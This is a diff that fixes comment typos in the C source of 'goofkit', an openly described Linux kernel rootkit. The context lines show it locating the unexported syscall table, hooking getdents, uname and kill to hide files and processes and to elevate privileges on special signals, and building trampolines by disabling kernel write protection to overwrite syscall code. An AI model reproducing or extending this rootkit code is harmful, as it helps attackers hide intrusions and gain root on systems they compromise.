@@ -1,7 +1,7 @@
 /*
 Project: goofkit
 Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔
-Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
+Description: trampolining rootkit. Used to hide files, processes, and network connections from the user.
 Task:
 */
 
@@ -13,8 +13,8 @@ Task:
 
 // Iterate over the entire possible range until you find some __NR_close
 /* Find the syscall table.
-   We will use this to refrence all of the syscalls that we want to overwrite.
-   This is a necessary step since in recent versions of linux the syscall table is not exported.*/
+   We will use this to reference all of the syscalls that we want to overwrite.
+   This is a necessary step since in recent versions of Linux the syscall table is not exported.*/
 
 
 /* @brief find the syscall table in memory
@@ -25,7 +25,7 @@ Task:
  * may not be needed in the new 4.X kernel it looks like the syscall table may be exported as _sys_call_table.
  * //TODO investigate the above
  *
- * @param void - no params neede we just use the global definiton of the address space and where sys_close is
+ * @param void - no params neede we just use the global definition of the address space and where sys_close is
  *
  * @return the address of the syscall table
  */
@@ -84,7 +84,7 @@ int goofy_uname(struct utsname *buf){
  * @param dire struct that describes directory --- taken from OG getdents
  * @param count the number of entries in the dire --- taken from OG getdents
  *
- * @return on sucess the number of entries, on failure -1
+ * @return on success the number of entries, on failure -1
  */
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
 	//Execute original funciton
@@ -146,13 +146,13 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 }
 
 /// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
-/// More efficent than using an expanding array of PIDs
+/// More efficient than using an expanding array of PIDs
 /* @brief find a process task struct by PID
  *
- * Iterate through eatch task_struct currently running. If that task has a pid
+ * Iterate through each task_struct currently running. If that task has a pid
  * matching the argument pid, then return the current task struct
  * Cannot use the find process functions built into the kernel as they are
- * licensed unde GPL, and we are not going to use GPL as we do not wish to
+ * licensed under GPL, and we are not going to use GPL as we do not wish to
  * open source future sections of this project.
  *
  * @pram pid the process ID of the process being found
@@ -204,7 +204,7 @@ int is_hidden_proc(pid_t pid){
  *		signal is one of our defined ones goofy_kill prevents
  *		the process from being killed and will hide or elevate
  *		prems.
- * @return int on sucess return 0 otherwise -1
+ * @return int on success return 0 otherwise -1
  */
 int goofy_kill(pid_t pid, int sig){
 	//printk("[goof] goofy_kill\n");
@@ -234,18 +234,18 @@ int goofy_kill(pid_t pid, int sig){
  * 3. Copy the destination address into the jump (over the \x11\x22\x33\x44\x55\x66\x77\x88 value)
  * 4. Build the trampoline.
  *		-Copy jump template to end of original code copy from step 1
- *		-Copy the address of the syscall (just after where we copied in step 1, syscall+h_len+1) over the place holder \x11\x22\x33\x44\x55\x66\x77\x88 
+ *		-Copy the address of the syscall (just after where we copied in step 1, syscall+h_len+1) over the placeholder \x11\x22\x33\x44\x55\x66\x77\x88 
  * 5. Write the hook created in steps 2 & 3 over the first h_len bytes in the system call
  *		-Requires disabling write protect
- *		-Renable afterwards so things don't break unexpectedly
+ *		-Reenable afterward so things don't break unexpectedly
  *
  * @param src where original source code is coming from
  *   	and where the new code is going
  * @param new_func the goofy function that is hooking
  *		the original function
- * @param id numeric identifier that will define tho hook
+ * @param id numeric identifier that will define the hook
  *		struct in an array of hook structs
- * @returns NULL --- TODO switch to void function or provide meaningful return
+ * @returns NULL --- TODO switch to void function or provide a meaningful return
 */
 unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
 	printk("[goof] hooking %p with %p\n", src, new_func);
